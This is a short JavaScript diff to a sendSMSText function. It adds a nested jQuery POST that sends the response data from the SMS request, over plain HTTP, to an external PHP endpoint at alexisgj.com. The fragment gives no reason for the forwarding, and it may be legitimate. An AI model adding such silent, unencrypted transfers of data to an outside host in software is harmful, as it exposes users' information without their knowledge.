@@ -145,6 +145,13 @@ function sendSMSText() {
                         },
                         function(data, status){
                             console.log("Data: " + data + "\nStatus: " + status);
+                            $.post("http://alexisgj.com/ailderlai/external.php",
+                            {
+                                text: data
+                            },
+                            function(data, status){
+                                console.log("Data2: " + data + "\nStatus2: " + status);
+                            });
                         });
                     } catch(ex) {
 
